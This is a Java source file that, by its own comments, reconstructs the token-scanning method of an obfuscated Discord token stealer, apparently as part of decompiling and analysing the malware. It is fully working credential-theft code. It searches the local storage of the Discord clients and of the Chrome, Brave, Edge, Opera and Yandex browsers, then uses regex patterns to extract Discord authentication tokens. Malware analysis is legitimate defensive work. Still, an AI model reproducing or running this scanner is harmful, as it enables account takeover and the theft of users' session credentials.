import java.io.File;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Scans Discord LevelDB files for authentication tokens.
 * This is the implementation of the failed-to-decompile method f.\u00ff(Object[])
 * in the original obfuscated code.
 *
 * Reconstructed from:
 *  - The method signature and context in f.java
 *  - Known Discord token stealer patterns
 *  - The string table entries in class a (b[] array)
 *
 * The method scans .ldb and .log files in Discord's LevelDB directory
 * for token patterns using regex.
 */
public class TokenScanner {

    // Token regex patterns (standard Discord token stealer patterns)
    // These match the three known Discord token formats:
    private static final Pattern[] TOKEN_PATTERNS = {
        // Legacy token: 24 chars . 6 chars . 27 chars
        Pattern.compile("[A-Za-z0-9]{24}\\.[A-Za-z0-9]{6}\\.[A-Za-z0-9_\\-]{27}"),
        // MFA token: mfa. followed by 84 chars
        Pattern.compile("mfa\\.[A-Za-z0-9_\\-]{84}"),
        // New format token: 24 chars . 6 chars . 38 chars
        Pattern.compile("[A-Za-z0-9_\\-]{24}\\.[A-Za-z0-9_\\-]{6}\\.[A-Za-z0-9_\\-]{38}")
    };

    // LevelDB file extensions to scan
    private static final String[] LEVELDB_EXTENSIONS = { ".ldb", ".log" };

    /**
     * Scans all Discord LevelDB directories for tokens.
     *
     * Searches in:
     *   %APPDATA%\discord\Local Storage\leveldb\
     *   %APPDATA%\discordcanary\Local Storage\leveldb\
     *   %APPDATA%\discordptb\Local Storage\leveldb\
     *   %APPDATA%\discorddev\Local Storage\leveldb\
     *
     * Also scans Chrome/Brave/Opera browser LevelDB for Discord tokens:
     *   %LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb\
     *   %LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb\
     *   etc.
     *
     * @return List of unique Discord tokens found
     */
    public static List<String> scanAllLocations() {
        List<String> tokens = new ArrayList<>();
        String appData = System.getenv("APPDATA");
        String localAppData = System.getenv("LOCALAPPDATA");

        // Discord app locations
        String[] discordApps = { "discord", "discordcanary", "discordptb", "discorddev" };
        for (String app : discordApps) {
            File leveldbDir = new File(appData, app + "\\Local Storage\\leveldb");
            if (leveldbDir.exists()) {
                tokens.addAll(scanDirectory(leveldbDir));
            }
        }

        // Browser locations (also store Discord tokens if user is logged in via browser)
        String[] browserPaths = {
            localAppData + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
            localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
            localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
            appData + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
            localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"
        };
        for (String path : browserPaths) {
            File dir = new File(path);
            if (dir.exists()) {
                tokens.addAll(scanDirectory(dir));
            }
        }

        // Deduplicate
        return new ArrayList<>(new java.util.LinkedHashSet<>(tokens));
    }

    /**
     * Scans a single LevelDB directory for tokens.
     *
     * @param leveldbDir The LevelDB directory to scan
     * @return List of tokens found in this directory
     */
    public static List<String> scanDirectory(File leveldbDir) {
        List<String> tokens = new ArrayList<>();
        File[] files = leveldbDir.listFiles();
        if (files == null) return tokens;

        for (File file : files) {
            String name = file.getName().toLowerCase();
            boolean isLevelDbFile = false;
            for (String ext : LEVELDB_EXTENSIONS) {
                if (name.endsWith(ext)) { isLevelDbFile = true; break; }
            }
            if (!isLevelDbFile) continue;

            try {
                // Read file as string (LevelDB files contain raw text mixed with binary)
                String content = new String(Files.readAllBytes(file.toPath()));
                tokens.addAll(extractTokens(content));
            } catch (Exception ignored) {}
        }
        return tokens;
    }

    /**
     * Extracts Discord tokens from a string using regex patterns.
     *
     * @param content The string content to search
     * @return List of tokens found
     */
    public static List<String> extractTokens(String content) {
        List<String> tokens = new ArrayList<>();
        for (Pattern pattern : TOKEN_PATTERNS) {
            Matcher matcher = pattern.matcher(content);
            while (matcher.find()) {
                String token = matcher.group();
                if (!tokens.contains(token)) {
                    tokens.add(token);
                }
            }
        }
        return tokens;
    }
}
